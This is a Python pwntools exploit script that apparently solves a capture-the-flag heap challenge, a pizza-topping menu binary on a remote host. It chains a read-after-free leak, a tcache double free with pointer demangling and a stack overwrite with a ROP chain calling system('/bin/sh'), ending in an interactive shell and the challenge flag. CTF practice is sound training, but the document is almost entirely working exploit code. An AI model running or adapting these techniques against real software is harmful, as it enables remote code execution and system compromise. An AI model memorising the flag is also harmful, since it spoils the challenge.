#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.70.212.151 --port 8007 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.70.212.151'
port = int(args.PORT or 8007)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br *customize_topping+280
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'/lib'

toppings = [b"Tomato",b"Onion",b"Capsicum",b"Corn",b"Mushroom",b"Pineapple",b"Olives",b"Double",b"Paneer",b"Chicken"]

def cmd(i):
    io.sendlineafter(b": ",str(i).encode())

def prompt(m):
    io.sendlineafter(b"?\n",m)

def prompti(i):
    prompt(str(i).encode())

def add(idx,q):
    cmd(1)
    prompt(toppings[idx])
    prompti(q)

def customize(idx,m):
    cmd(2)
    if idx is not None:
        prompt(toppings[idx])
    else:
        prompt(b"JJJJ")
    io.sendlineafter(b": ",m)

def remove(idx):
    cmd(3)
    if idx is not None:
        prompt(toppings[idx])
    else:
        prompt(b"JJJJ")

def verify(idx):
    cmd(4)
    prompt(toppings[idx])

def bake(idx):
    cmd(5)
    prompt(toppings[idx])

io = start()

# Read-after-free for heap & libc leaks
# Double free (fastbin dup) for stack leak and arbitrary write

# leak heap base & libc base
# 7 tcache chunks + 1 unsorted chunk + dummy chunk to avoid consolidation
sz = 0x40-1
for i in range(9):
    add(i,sz)
remove(0)
verify(0)
lk = io.recvline()[:-1]
heap_base = unpack(lk,"all") << 12
log.info(f"heap : 0x{heap_base:x}")

for i in range(1,8):
    remove(i)
verify(7)
lk = io.recvline()[:-1]
libc = exe.libc
libc.address = unpack(lk,"all") - 0x219ce0
log.info(f"libc: 0x{libc.address:x}")

# get stack leak
sz2 = 11
for i in range(10):
    add(i,sz2)

for i in range(10):
    remove(i)
remove(8)

for i in range(9):
    add(i,sz2)

mgl = heap_base + 0x1000
mgl = mgl >> 12
libc_argv = libc.address + 0x21aa20
customize(7,p64(libc_argv ^ mgl))
add(7,sz2)
add(0,sz2)
verify(0)
lk = io.recvline()[:-1]
stack = unpack(lk,"all")
log.info(f"stack: 0x{stack:x}")

# write & trigger rop chain
sz2 = 14
for i in range(10):
    add(i,sz2)

for i in range(10):
    remove(i)
remove(8)

for i in range(9):
    add(i,sz2)

mgl = heap_base + 0x1000
mgl = mgl >> 12
## target where we will not run into trouble when key field of tcache chunk is cleared on malloc
target = stack - 0x260 - 8 - 0x40
customize(7,p64(target ^ mgl))
add(7,sz2)
add(0,sz2)
pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
rop = b"".join([p64(i) for i in rop])
customize(0,p64(0)*(8 + 1)+(rop)) # triggered when returning from read (no canary)

io.interactive()

# flag{n3v3r_h4v3_1_3v3r_h4d_p1n3app13_0n_p1zz4}
